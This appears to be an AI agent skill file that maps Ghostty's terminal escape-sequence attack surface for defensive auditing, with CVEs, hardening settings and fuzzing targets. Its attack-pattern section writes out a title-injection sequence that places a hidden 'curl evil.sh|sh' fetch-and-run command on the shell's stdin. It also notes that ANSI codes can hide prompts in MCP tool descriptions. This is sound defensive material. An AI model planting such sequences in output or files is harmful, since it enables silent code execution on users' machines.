---
name: modding-ghostty
description: Defensive security map of Ghostty terminal escape sequences. VT/OSC attack surface, stdin injection vectors, parser DFA analysis, CVE catalog. Triggers: ghostty security, escape sequence, terminal hardening, VT parser, OSC.
---

# Modding Ghostty

Defensive security map of Ghostty's VT/OSC escape sequence surface. Covers what each sequence visibly modifies on screen, invisible state mutations, stdin injection vectors, and parser DFA traversability toward undesired states.

## Trigger Conditions

- Analyzing terminal escape sequence security
- Auditing libghostty or apps built on it (cmux, etc.)
- Fuzzing VT parsers / OSC handlers
- Understanding what escape sequences change on the user's screen
- Building terminal-aware security tools

## Architecture: libghostty VT Parser

```
Raw Bytes -> UTF8Decoder -> Parser (DFA) -> Stream -> Actions
                            |
                      State Machine
                      (14 states, compile-time table)
```

Key files in ghostty-org/ghostty:
```
src/terminal/Parser.zig       # State machine (14 states)
src/terminal/stream.zig       # Stream wrapper + SIMD
src/terminal/osc.zig          # OSC parser (2048-byte fixed buffer)
src/terminal/dcs.zig          # DCS handler (1MB limit)
src/terminal/parse_table.zig  # Compile-time transition table
src/simd/vt.zig               # SIMD acceleration
```

## Visual Effects Map: What Each OSC Changes On Screen

```
+---------------------------------------------------------------------+
|  * * *   Terminal Window Title (OSC 0, 1, 2)          -  []  X      |
+---------------------------------------------------------------------+
|                                                                     |
|  Tab Bar:  [ ~/projects v ] [ SSH: server ] [ vim ]                 |
|            ^^^^^^^^^^^^^^^^                                         |
|            OSC 7 sets this     OSC 2 sets tab title                 |
|            (working directory)                                      |
|                                                                     |
+--- Terminal Content Area -------------------------------------------|
|                                                                     |
|  $ cat README.md                                                    |
|                                                                     |
|  This is normal text  <-- ground state: just prints codepoints      |
|                                                                     |
|  ==================== <-- OSC 4/10/11 change THESE colors:          |
|  = foreground on ba = <-- 10 = text color                           |
|  =  ckground colors = <-- 11 = background    } you see the         |
|  ==================== <-- 12 = cursor color   } palette shift       |
|                            4 = palette[0-255]   instantly           |
|                                                                     |
|  Click here for docs  <-- OSC 8 hyperlink: UNDERLINED text,        |
|  ~~~~~~~~~~~~~~~~~~        cursor becomes pointer on hover          |
|                            (OSC 22 changes pointer shape too)       |
|                                                                     |
|  $ echo "copied!"                                                   |
|  +------------------+                                               |
|  | CLIPBOARD        | <-- OSC 52 write: you see NOTHING on         |
|  | (invisible)      |     screen. It silently changes what          |
|  | "malicious addr" |     Cmd+V pastes next. No visual cue.        |
|  +------------------+                                               |
|                                                                     |
|  $ pwd                                                              |
|  /Users/alice/projects <-- OSC 7: NOTHING changes in content area.  |
|                            But tab/title bar updates, and           |
|                            "New Tab" will open HERE                  |
|                                                                     |
|  $ _               <-- OSC 12 changed cursor to this color         |
|    ^cursor                                                          |
|                                                                     |
+--- What's INVISIBLE (the dangerous part) ---------------------------|
|                                                                     |
|  OSC 52 READ -->  ? sent to terminal                                |
|                   terminal writes clipboard contents                |
|                   BACK INTO STDIN (as if you typed it)              |
|                   +------------------------------------+            |
|                   | $ rgb:ff/ff/ff                     | < color    |
|                   | $ secret-api-key-from-clipboard    | < clipboard|
|                   | $ My Private Window Title          | < title    |
|                   +------------------------------------+            |
|                   YOU SEE THESE APPEAR AS IF YOU TYPED THEM         |
|                   (the "response injection" class of attacks)       |
|                                                                     |
|  CSI 21t    -->  Reports title back as keystrokes                   |
|  DECRQSS    -->  Reports settings back as keystrokes                |
|  OSC 10-12? -->  Reports colors back as keystrokes                  |
|                                                                     |
+---------------------------------------------------------------------+
```

## Visibility Matrix

```
                          VISIBLE          INVISIBLE        INVISIBLE
                          ON SCREEN        BUT MODIFIES     STDIN INJECTION
                          (you notice)     STATE            (most dangerous)
                         ---------------  --------------   ----------------
 OSC 0  (icon+title)     title bar Y
 OSC 1  (icon)           (unimplemented)
 OSC 2  (title)          title bar Y
 OSC 4  (palette)        colors shift Y
 OSC 7  (cwd)                             tab label,
                                          new-tab path
 OSC 8  (hyperlink)      underline Y,
                          hover cursor Y
 OSC 9  (notification)   system notif Y
 OSC 10 (fg color)       text recolors Y
 OSC 11 (bg color)       bg recolors Y
 OSC 12 (cursor color)   cursor recolors Y
 OSC 22 (pointer)        mouse cursor Y
 OSC 52 (clipboard)                       clipboard          read -> stdin
                                          contents
 OSC 4? (query)                                              rgb:xx/xx -> stdin
 OSC 10-12? (query)                                          rgb:xx/xx -> stdin
 CSI 21t (title report)                                      title -> stdin
 DECRQSS (DCS query)                                         settings -> stdin
```

## OSC Sequences Ranked by Traversability to Undesired States

### Tier 1: Surprisingly Traversable (High developer-surprise factor)

| # | Sequence | Undesired State | Why Surprising |
|---|----------|----------------|----------------|
| 1 | **OSC 8** (Hyperlinks) | Arbitrary code execution on click | No URI scheme validation. `file:///path/to/binary` passed directly to `NSWorkspace.open()` / `xdg-open`. Missing scheme = file path on macOS. CVE-2024-38396 (iTerm2), CVE-2025-43929 (kitty). |
| 2 | **OSC 52** (Clipboard read) | Silent clipboard exfiltration | Default `ask` but "Remember" button permanently downgrades to `allow`. No rate limiting. Once allowed, any program polls clipboard forever. |
| 3 | **OSC 2 + CSI 21t** (Title set + report) | Command injection into shell | CVE-2003-0063 (xterm 2003), CVE-2024-56803 (Ghostty 1.0.0 release day). Parser correct; policy of echoing title to PTY stdin is the flaw. |

### Tier 2: Parser-Level State Machine Risks

| # | Sequence | Undesired State | Mechanism |
|---|----------|----------------|-----------|
| 4 | Unterminated OSC (any) | Parser stuck in `osc_string` | Fixed 2048-byte buffer catches most, but OSC 52/66 with allocator has no hard memory limit. |
| 5 | C1 control codes (0x80-0x9F) | Incorrect state transition | `0x9D`=OSC, `0x9B`=CSI, `0x90`=DCS as single bytes. Bypasses naive filters. UTF-8 mode must not treat these as C1. |
| 6 | Truncated OSC (e.g. `\033]1`) | Integer overflow crash | Issue #8007: `osc.Parser.reset()` called `ArrayList.deinit` without valid allocator. Fixed in 1.2.0. |
| 7 | SOS/PM/APC passthrough | Untested state paths | Share DFA structure with DCS/OSC but rarely exercised. Least-tested code. |

### Tier 3: Handler-Layer Policy Risks

| # | Sequence | Undesired State | Mechanism |
|---|----------|----------------|-----------|
| 8 | OSC 7 (Working directory) | Path spoofing | `"localhost"` always passes `isLocal()`. Any program sets reported CWD. New tab opens in spoofed directory. |
| 9 | OSC 52 (Clipboard write) | Clipboard hijacking | Default `allow`. Any program silently overwrites clipboard. Crypto address replacement. |
| 10 | OSC 4/10-19 (Color query) | Information leakage | Responses reveal terminal theme. Feeds fingerprinting. |
| 11 | DCS DECRQSS | Response injection | CVE-2008-2383 (xterm), CVE-2022-45872 (iTerm2 CVSS 9.8). |

### Tier 4: Delivery-Layer Amplifiers

| # | Vector | Effect |
|---|--------|--------|
| 12 | Log file escape injection | `cat access.log` triggers any of the above. CVE-2009-4487. |
| 13 | npm/pip output injection | Package metadata with escape sequences. |
| 14 | MCP tool description injection | ANSI in tool descriptions hides malicious prompts (Trail of Bits 2025). |

## Parser DFA Safety Properties

### What's Well-Designed

- **`.invalid` is a proper sink state**: Once buffer overflows, all bytes discarded until reset. `end()` returns `null`.
- **No re-entrancy**: One byte at a time via `Parser.next()`. No callbacks or recursive parsing.
- **State isolation**: ESC inside `dcs_passthrough` or `osc_string` is treated as data, NOT an escape initiator (except via "anywhere" transitions for ESC -> `escape` state from `osc_string`).
- **Reset on entry**: `osc_parser.reset()` called on every transition into `osc_string`. No stale state leaks.
- **CAN/SUB abort**: `0x18` (CAN) or `0x1A` (SUB) abort any sequence from any state -> `ground`.

### What's Risky

- **OSC 52/66 allocating writer**: No hard memory limit when allocator provided. Multi-GB base64 payload could exhaust memory.
- **OSC 8 URI handling**: No scheme allowlist. Arbitrary URIs passed to system opener. `file://`, `ssh://`, `tel:`, custom schemes all honored.
- **"Remember" button on clipboard ask dialog**: Single click permanently downgrades `ask` -> `allow` for session.
- **No rate limiting on any response-generating sequence**: OSC 52 read, color queries, title report (when enabled) can be spammed.

## The Classic Attack Pattern

```
    WHAT YOU SEE                    WHAT ACTUALLY HAPPENS
    ---------------                 -----------------------

    $ cat file.txt                  file.txt contains:
    Hello world                     Hello world
    Segmentation fault              \e]2;curl evil.sh|sh\a   <- set title
    (core dumped)                   \e[21t                    <- report title
    $                               \e[8m                     <- HIDE TEXT
                                    ^^^ now "curl evil.sh|sh"
                                    appears on your stdin
                                    as if you typed it

    You see "Segfault" and          The injected command is
    press Enter thinking            invisible (\e[8m = hidden)
    it's waiting for input    ->    SHELL EXECUTES: curl evil.sh|sh
```

## Ghostty-Specific CVEs

| CVE | Version | Severity | Description | Fix |
|-----|---------|----------|-------------|-----|
| CVE-2024-56803 | < 1.0.1 | Medium (5.1) | Title reporting (CSI 21t) enabled by default. Classic title injection RCE. | Disabled title reporting by default. |
| GHSA-q9fg-cpmh-c78x | < 1.2.0 | Medium | Privilege escalation when launched by other apps (inherits Full Disk Access). | App-level permission scoping. |
| Issue #8007 | < 1.2.0 | Medium | Truncated OSC causes integer overflow in `osc.Parser.reset()` via `ArrayList.deinit` without valid allocator. | Conditional deinit when alloc non-null. |

## Configuration Hardening

```ini
# ghostty config (~/.config/ghostty/config)

# Disable title reporting (default since 1.0.1)
title-report = false

# Require confirmation for clipboard reads
clipboard-read = ask

# Consider requiring confirmation for clipboard writes too
clipboard-write = ask

# OSC 52 is the main clipboard vector
# These are the only knobs available
```

## Fuzzing Targets (for defensive testing)

Priority targets for property-based testing / fuzzing:

1. **OSC parser with allocator**: Feed multi-MB base64 to OSC 52 path
2. **C1 control codes in UTF-8 mode**: Bytes 0x80-0x9F should NOT trigger state transitions
3. **Rapid sequence interleaving**: ESC mid-OSC, CAN mid-DCS, nested attempts
4. **OSC 8 URI content**: Long URIs, null bytes, embedded escapes, scheme-less paths
5. **Truncated sequences at every parse state**: Especially `osc_string` -> `reset()` path
6. **SOS/PM/APC**: Rarely-tested passthrough states sharing DFA structure

## Key References

- David Leadbeater (dgl), "[31m"?! ANSI Terminal security in 2023 -- https://dgl.cx/2023/09/ansi-terminal-security
- David Leadbeater, Ghostty CVE-2024-56803 -- https://dgl.cx/2024/12/ghostty-terminal-title
- Julia Evans, Standards for ANSI escape codes (2025) -- https://jvns.ca/blog/2025/03/07/escape-code-standards/
- Trail of Bits, ANSI terminal codes in MCP (2025) -- https://blog.trailofbits.com/2025/04/29/deceiving-users-with-ansi-terminal-codes-in-mcp/
- solid-snail, iTerm2 RCE -- https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce
- vt100.net DFA specification -- https://vt100.net/emu/dec_ansi_parser
- Ghostty VT reference -- https://ghostty.org/docs/vt/reference
- Mitchell Hashimoto, libghostty announcement -- https://mitchellh.com/writing/libghostty-is-coming

## Related Skills

- `libghostty-vt`: Parser DFA details and API
- `reverse-engineering`: Binary analysis of compiled parser
- `fuzzing-obstacles`: Overcoming coverage plateaus in VT parser fuzzing
- `property-based-testing`: Generating adversarial escape sequences
- `variant-analysis`: Finding CVE variants across terminal emulators
- `insecure-defaults`: Detecting fail-open config (clipboard-write=allow)
- `sandbox-escape-detector`: Testing terminal sandbox boundaries
- `entry-point-analyzer`: Mapping handler entry points from parser actions
- `bisimulation-game`: Comparing parser behavior across terminal implementations
- `obstruction-learning`: Detecting H0 obstructions in state machine coverage
- `bifurcation`: State machine bifurcation points where behavior qualitatively changes
- `stability`: Lyapunov analysis of parser state invariants
- `invariant-set`: Sets preserved by the parser DFA flow
- `phase-space-transformation`: Coordinate changes in parser state space
- `constant-time-analysis`: Timing side-channels in parser processing
- `cryptographic-audit`: OSC 52 clipboard data handling, TLS in terminal contexts
- `attractor`: Fixed points and limit cycles in parser state machine

## GF(3) Assignment

```
Trit: -1 (MINUS) - Validator/constrainer
Hue: 210 (blue - cold, defensive analysis)
```

Triads:
- `modding-ghostty (-1)` x `libghostty-vt (+1)` x `bisimulation-game (0)` = 0
- `modding-ghostty (-1)` x `attractor (+1)` x `phase-space-transformation (0)` = 0
